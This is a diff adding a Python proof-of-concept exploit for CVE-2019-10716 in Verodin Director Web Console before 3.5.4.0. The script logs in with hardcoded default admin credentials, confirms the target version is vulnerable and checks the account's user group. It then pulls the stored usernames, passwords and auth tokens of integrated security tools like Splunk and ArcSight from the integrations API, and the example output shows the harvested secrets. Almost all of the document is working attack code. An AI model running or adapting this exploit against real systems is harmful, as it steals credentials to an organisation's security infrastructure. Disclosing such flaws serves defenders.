@@ -1,0 +1,187 @@
+#  Exploit Title: Verodin Director Web Console 3.5.4.0 - Remote Authenticated Password Disclosure (PoC)
+#  Discovery Date: 2019-01-31
+#  Exploit Author: Nolan B. Kennedy (nxkennedy)
+#  Vendor Homepage: https://www.verodin.com/
+#  Software Link : https://www.verodin.com/demo-request/demo-request-form
+#  Tested Versions: v3.5.1.0, v3.5.2.0, v3.5.3.1
+#  Tested On: Windows
+#  CVE: CVE-2019-10716
+#  Vulnerability Type: Sensitive Data Disclosure
+###
+# Description: Verodin Director's REST API allows authenticated users to query the configuration
+#       details, which include credentials, of any 50+ possible integrated security tools (e.g. Splunk, ArcSight, Palo Alto, AWS Cloud Trail).
+#       Fortunately for attackers, members of 3 out of the 4 user groups in the Director can query this info (Users, Power Users, System Admin). 
+#
+#       API Request: GET https://<director-ip>/integrations.json
+#
+# Usage: python3 script.py
+#
+# Example Output:
+#
+#       -- VERODIN DIRECTOR WEB CONSOLE < V3.5.4.0 - REMOTE AUTHENTICATED PASSWORD DISCLOSURE (POC) --
+#	-- Author: Nolan B. Kennedy (nxkennedy) --
+#
+#
+#       [+] Director Version
+#       =====================
+#       [*] Detected version 3.5.1.0 is VULNERABLE! :)
+#
+#
+#       [+] Account Permissions
+#       ========================
+#       [*] "admin@verodin.com" is a member of "System Admin"
+#
+#
+#       [+] Verodin Integrations
+#       =========================
+#       [*] Product: splunk
+#       [*] Username: splunk_svc_acct
+#       [*] Misc (may include credentials): [{'scheme': 'https', 'basic': False, 'password': 'Sup3rP@ssw0rd',
+#       'port': 8089, 'host': '10.0.0.6', 'username': 'splunk_svc_acct'},
+#       {'proxy_hash': None}]
+#
+#       [*] Product: arcsight
+#       [*] Username: arcsight_admin
+#       [*] Misc (may include credentials): ['10.0.0.7', 8443, 'https', 'arcsight_admin', 'Sup3rP@ssw0rd',
+#       "/All Filters/Personal/integration_user's filters/Verodin Filter", 'Verodin Query Viewer', 60]
+#
+#       [+] Done!
+###
+
+import base64
+from distutils.version import LooseVersion
+import json
+import re
+import ssl
+from sys import exit
+from time import sleep
+import urllib.request
+
+
+
+
+verodin_ip = '0.0.0.0'
+# Default System Admin creds. Worth a try.
+username = 'admin@verodin.com'
+password = 'Ver0d!nP@$$'
+base_url = 'https://{}'.format(verodin_ip)
+fixed_version = '3.5.4.0'
+
+
+# We'll be making 3 different requests so we need a web handling function
+def requests(target, html=False):
+
+        url = base_url + target
+        context = ssl._create_unverified_context() # so we don't get an ssl cert error
+        req  = urllib.request.Request(url)
+        credentials = ('{}:{}'.format(username, password))
+        encoded_credentials = base64.b64encode(credentials.encode('ascii'))
+        req.add_header('Authorization', 'Basic %s' % encoded_credentials.decode("ascii")) # use %s instead of format because errors
+        r = urllib.request.urlopen(req, context=context)
+        content = r.read().decode('utf-8')
+        if r.getcode() == 200:
+                # we don't always get a 401 if auth fails
+                if 'Cookies need to be enabled' in content: 
+                        print('[!] Failed to retrieve data: Credentials incorrect/invalid')
+                        print()
+                        print('[!] Exiting...')
+                        exit(1)
+                elif html:
+                        blob = content
+                else:
+                        blob = json.loads(content)
+                return blob
+        elif r.getcode() == 401:
+                print('[!] Failed to retrieve data: Credentials incorrect/invalid')
+                print()
+                print('[!] Exiting...')
+                exit(1)
+        else:
+                print('[!] ERROR: Status Code {}'.format(r.getcode()))
+                exit(1)
+                
+
+# Do we have permissions to retrieve the creds? 
+def getUserPerms():
+
+	target = '/users/user_prefs.json'
+	r = requests(target) # returns a single json dict
+	print('\n[+] Account Permissions')
+	print('========================')
+	group_id = r['user_group_id']
+	roles = {'Reporting': 4, 'Users': 3, 'Power Users': 2, 'System Admin': 1}
+	for role,value in roles.items():
+		if group_id == value:
+			print('[*] "{}" is a member of "{}"'.format(username, role))
+			print()
+			if group_id == 4:
+				print('[!] This account does not have sufficient privs. You need "Users" or higher.')
+				print()
+				print('[!] Exiting...')
+				exit(1)
+	sleep(0.5)
+	
+
+# We need to verify the target Director is running a vulnerable version
+def checkVuln():
+
+	target = '/settings/system'
+	r = requests(target, html=True)
+	field = re.search(r'Director\sVersion:.*', r)
+	version = field.group().split('<')[0].split(" ")[2]
+	print('\n[+] Director Version')
+	print('=====================')
+	if LooseVersion(version) < LooseVersion(fixed_version):
+		print('[*] Detected version {} is VULNERABLE! :)'.format(version))
+		print()
+	else:
+		print('[!] Detected version {} is not vulnerable. Must be < {}'.format(version, fixed_version))
+		print()
+		print('[!] Exiting...') 
+
+	sleep(0.5)
+	
+
+# Where we parse out any creds or other useful info 
+def getLoot():
+
+        target = '/integrations.json'
+        r = requests(target)  # a list of json dicts
+        print('\n[+] Verodin Integrations')
+        print('=========================')
+        if not r:
+                print('[+] Dang! No integrations configured in this Director :(')
+                print()
+        else:
+                for integration in r:
+                        product = integration['package_name'] # constant key
+                        misc = integration.get('new_client_args') # we use .get to return a None type if the key doesn't exist
+                        user = integration.get('username')
+                        passw = integration.get('password')
+                        token = integration.get('auth_token')
+                        print('[*] Product: {}'.format(product))
+                        if user:
+                                print('[*] Username: {}'.format(user))
+                        if passw:
+                                print('[*] Password: {}'.format(passw))
+                        if token and token is not 'null':
+                                print('[*] Auth Token: {}'.format(token))
+                        if misc:
+                                print('[*] Misc (may include credentials): {}'.format(misc))
+                        print()
+        sleep(0.5)
+
+
+def main():
+
+	print('\n-- Verodin Director Web Console < v3.5.4.0 - Remote Authenticated Password Disclosure (PoC) --'.upper())
+	print('-- Author: Nolan B. Kennedy (nxkennedy) --')
+	print()
+	checkVuln()
+	getUserPerms()
+	getLoot()
+	print('[+] Done!')
+			
+		
+if __name__ == '__main__':
+	main()
